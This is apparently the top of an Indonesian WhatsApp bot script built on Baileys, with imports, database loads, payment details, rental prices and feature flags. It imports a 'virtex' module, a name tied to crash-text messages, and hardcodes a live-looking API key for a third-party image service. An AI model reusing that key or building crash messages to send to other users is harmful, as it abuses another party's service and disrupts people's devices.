/*

	あ GK KASI CREDIT YT ZEEONE OFC, GK USAH RE UPLOAD
	あ SUSAH" NGE FIX, LU CUMA NUMPANG NAMA DOANG
	あ YANG BELUM PAHAM CAR RUN DI HEROKU TONTON AJA VIDEO SEBELUMNYA
	あ FITUR JUALAN TELAH DI HAPUS [ Bisa order sama saya klo mau ]
	
	あ JASA RUN HEROKU BISA PC wa.me/62887435047326 BIAR BOT NYA GAK TERLALU DELAY
	
*/   
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const crypto = require('crypto')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const os = require('os')
const axios = require("axios")
const hx = require('hxz-api')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const simple = require('./lib/simple.js')
const _sewa = require("./lib/sewa");
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const {animek, fetchJson, hitall, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const { yta2, ytv2, ytv3, ytv4} = require('./lib/y2mate')
const { tiktokDown } = require("./lib/tiktok")
const { webp2mp4File} = require('./lib/webp2mp4')
const { mediafireDl} = require('./lib/mediafire.js')
const { msgFilter } = require('./lib/antispam')
const { downloadig, igstory } = require("./lib/instadl.js");
const { virtex, vipi } = require('./lib/virtex.js')
const setTtt = require('./lib/tictactoe.js')
const off = require('./lib/afk.js')
let _off = JSON.parse(fs.readFileSync('./src/afk.json'))
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { addVote, delVote } = require('./lib/vote')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const premium = require("./lib/premiun");
const { uploadImages } = require('./lib/uploadimage')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/about_user")
const { list_aov } = require('./shop/aov')
const { list_cod } = require('./shop/cod')
const { list_sausage } = require('./shop/sausage')
const { list_lol } = require('./shop/lol')
const { list_valo } = require('./shop/valo')
const { list_price } = require('./shop/price')
const { allpayment } = require('./shop/allpayment')
const { pc_sewa } = require('./shop/sewa')
const { gcbotwa } = require('./shop/grupbot')
const { donasibot } = require('./shop/donasi')
const { infobot } = require('./shop/infobot')
const { jadibut } = require('./shop/jadibot')

const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const glimit = JSON.parse(fs.readFileSync('./database/glimit.json'))
const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const register = JSON.parse(fs.readFileSync('./database/user/register.json'))
const  _premium = JSON.parse(fs.readFileSync('./src/premiun.json'));
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antivirtex = JSON.parse(fs.readFileSync("./src/antivirtex.json"))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const absen = JSON.parse(fs.readFileSync('./src/absen.json'))
const tictactoe = JSON.parse(fs.readFileSync("./src/tictactoe.json"))
const _win = JSON.parse(fs.readFileSync('./src/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./src/tttlose.json'))
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const scommand = JSON.parse(fs.readFileSync('./lib/scommand.json'))
const banned = JSON.parse(fs.readFileSync('./src/banned.json'))
const _nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const _leveling = JSON.parse(fs.readFileSync('./src/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./src/level.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./src/tebakgambar.json'))
const caklontong = JSON.parse(fs.readFileSync('./src/caklontong.json'))
const family = JSON.parse(fs.readFileSync('./src/family100.json'))
const siapakahaku = JSON.parse(fs.readFileSync('./src/siapakahaku.json'))
const tebakanime = JSON.parse(fs.readFileSync('./src/tebakanime.json'))
const tebakkalimat = JSON.parse(fs.readFileSync('./src/tebakkalimat.json'))
const tebakkata = JSON.parse(fs.readFileSync('./src/tebakkata.json'))
const tebaklirik = JSON.parse(fs.readFileSync('./src/tebaklirik.json'))
const tekateki = JSON.parse(fs.readFileSync('./src/tekateki.json'))
const susunkata = JSON.parse(fs.readFileSync('./src/susunkata.json'))

const  sewa = JSON.parse(fs.readFileSync('./src/sewa.json'));
const event = JSON.parse(fs.readFileSync('./src/event.json'))


//var creatorList = ['Creator WhatsApp Bot', 'Whatsapp Bot Indonesia', 'Creator Bot' , ' Bot WhatsApp']
var creator = setting.ownername
const  { ind, eng, es, ml, ru, pt } = require(`./language`)
lang = ind //language
const Exif = require('./lib/exif')
const exif = new Exif()

//set_sticker_command//
cmd_stc_menu = '7446'
cmd_stc_ping = '7292'
cmd_stc_play_music = '8046'
cmd_stc_group_close = '7850'
cmd_stc_group_open = '7878'
cmd_stc_image_to_sticker = '7688'
cmd_stc_to_image = '6964'
cmd_stc_self = '7038'
cmd_stc_public = '7144'
//set_sticker_command//
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /*
SEBAGIAN LU EDIT DI SETTING.JSON
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
var nomor_ovo = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var nomor_dana = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var nomor_gopay = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var qr_code_ovo = 'https://h.top4top.io/p_2053vk0uw1.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_dana = 'https://j.top4top.io/p_20532posd1.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_gopay = 'https://i.top4top.io/p_2053em3vh1.jpg' //gk usah di ubah ya klo gk punya ntr eror

var _minggu = 'Rp 10.000,00' //Masukkan harga sewa sesuai keinginan
var __minggu = 'Rp 15.000,00'
var ___minggu = 'Rp 20.000,00'
var _bulan = 'Rp 22.000,00'
var _permanen = 'Rp 100.000,00'
var __permanen = 'Rp 150.000,00'

zeksApikey = 'Alphabott' //ganti pake apikey lu biar limitnya gk cepet abis 
ApiZeks = 'https://api.zeks.me' // regis disini klo mau dapat apikeynya
thumbnail = setting.thumb
pp_bot = fs.readFileSync(`image/${thumbnail}`)
pp_bot2 = fs.readFileSync(`image/${setting.thumbnail}`)
fthumb = setting.fakethumb
hit_today = []
blocked = []
ban = []
limitawal = "50"
gcounttprem = "50" 
gcounttuser = "25" 

let multi = true
let nopref = false
let single = false
let prefa = setting.prefix
let menusimple = false
let Mloc = false
let autobio = setting.autobio
let antihidetag = setting.antihidetag

banChats = setting.self_mode
autorespon = true
offline = false
readGc = true 
readPc = false 
antitrol = false 
bugc = false
autovn = true
autoketik = false
autoregister = setting.user_register
typemenu = 'document'
img = setting.img
apiku = 'https://zeeoneofc.github.io/'
gc_wa_lu = 'https://chat.whatsapp.com/EU890BcXjyBDkNaUT5WmYV' //klo gk punya gc wa gk usah di ganti 👍
targetpc = setting.ownerNumberr
owner = targetpc
fake = setting.fake
numbernye = '0'
waktu = 'Nothing'
alasan = 'Nothing'
botname = setting.botname
baper = `© ${botname} | ${creator}`
ownername = setting.ownername
peknem = setting.ownername
ownerNumber = setting.ownerNumber
cr = setting.cr
petik = '```'
titik =`...`
enter ='\n'
msgId="B826873620DD5947E683E3ABE663F263"
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
winawal = 1 
loseawal = 1 
memberwin = 1 
memberlose = 1 

//Credit For 404 SQUAD ( Gk usah di hapus mek)
//Lingz
//Felix
//Lenz
//Arya
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const ikan = JSON.parse(fs.readFileSync('./database/user/ikan.json'))
const planet = JSON.parse(fs.readFileSync('./database/user/planet.json'))
const coal = JSON.parse(fs.readFileSync('./database/user/coal.json'))
const stone = JSON.parse(fs.readFileSync('./database/user/stone.json'))
const ore = JSON.parse(fs.readFileSync('./database/user/ore.json'))
